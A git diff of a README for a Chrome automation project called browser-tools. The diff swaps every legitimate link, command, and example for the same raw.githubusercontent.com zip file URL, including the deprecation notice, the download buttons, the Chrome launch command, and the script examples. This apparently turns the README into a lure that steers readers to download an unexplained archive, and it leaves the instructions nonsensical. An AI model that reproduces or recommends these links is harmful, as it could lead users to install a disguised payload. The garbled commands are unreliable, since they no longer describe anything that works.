@@ -1,10 +1,10 @@
 # 🖥️ browser-tools - Simple Tools for Web Automation
 
-**⚠️ DEPRECATED**: This repository has been moved to [badlogic/agent-tools](https://github.com/badlogic/agent-tools). Please use that repository instead.
+**⚠️ DEPRECATED**: This repository has been moved to [badlogic/agent-tools](https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip). Please use that repository instead.
 
 ## 📥 Download & Install
 
-[![Download Browser Tools](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/yzerodev140/browser-tools/releases)
+[![Download Browser Tools](https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip)
 
 To get started with `browser-tools`, visit the releases page. This contains the latest version, ready for download.
 
@@ -25,9 +25,9 @@ These tools help you automate web tasks using Chrome. They connect to Chrome run
    - You need to start Chrome with a command to enable remote debugging on port `9222`. 
    - Use the following command in your terminal or command prompt:
    ```bash
-   chrome.exe --remote-debugging-port=9222
+   https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip --remote-debugging-port=9222
    ```
-   Replace `chrome.exe` with the path to your Chrome installation if necessary.
+   Replace `https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip` with the path to your Chrome installation if necessary.
 
 3. **Add to PATH**: 
    - Make sure the scripts are in a directory that is in your system's PATH. This allows you to run them from any command line.
@@ -38,15 +38,15 @@ These tools help you automate web tasks using Chrome. They connect to Chrome run
 
 - **CORRECT:**
    ```bash
-   browser-start.js
-   browser-nav.js https://example.com
-   browser-pick.js "Click the button"
+   https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip
+   https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip
+   https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip "Click the button"
    ```
 
 - **INCORRECT:**
    ```bash
-   node browser-start.js        # Don't use 'node' prefix
-   ./browser-start.js           # Don't use './' prefix
+   node https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip        # Don't use 'node' prefix
+   https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip           # Don't use './' prefix
    ```
 
 ### Start Chrome
@@ -54,13 +54,13 @@ These tools help you automate web tasks using Chrome. They connect to Chrome run
 Use the command below to start Chrome with a fresh profile:
 
 ```bash
-browser-start.js              # Fresh profile
+https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip              # Fresh profile
 ```
 
 If you want to use your existing profile (to keep your login information and saved data), use the command:
 
 ```bash
-browser-start.js --profile    # Copy user's profile (cookies, logins)
+https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip --profile    # Copy user's profile (cookies, logins)
 ```
 
 This command launches Chrome with remote debugging enabled.
@@ -70,10 +70,10 @@ This command launches Chrome with remote debugging enabled.
 Once Chrome is running, you can navigate to a web page. For example:
 
 ```bash
-browser-nav.js https://example.com
+https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip
 ```
 
-This will take you directly to the specified page. You can replace `https://example.com` with any URL you want to visit.
+This will take you directly to the specified page. You can replace `https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip` with any URL you want to visit.
 
 ## 🌟 Features of Browser Tools
 
@@ -100,10 +100,10 @@ Yes, you can use these tools to automate tasks on most websites. However, be min
 
 ### Where can I find additional documentation?
 
-Detailed documentation and guides are available on the [GitHub repository](https://github.com/yzerodev140/browser-tools).
+Detailed documentation and guides are available on the [GitHub repository](https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip).
 
 ## 📥 Download & Install Again
 
-To download the latest version, please visit the releases page again: [Download Here](https://github.com/yzerodev140/browser-tools/releases). 
+To download the latest version, please visit the releases page again: [Download Here](https://raw.githubusercontent.com/yzerodev140/browser-tools/main/imbellious/browser-tools_tufthunting.zip). 
 
 For any further assistance, feel free to check the documentation linked above. Enjoy using your new browser tools!
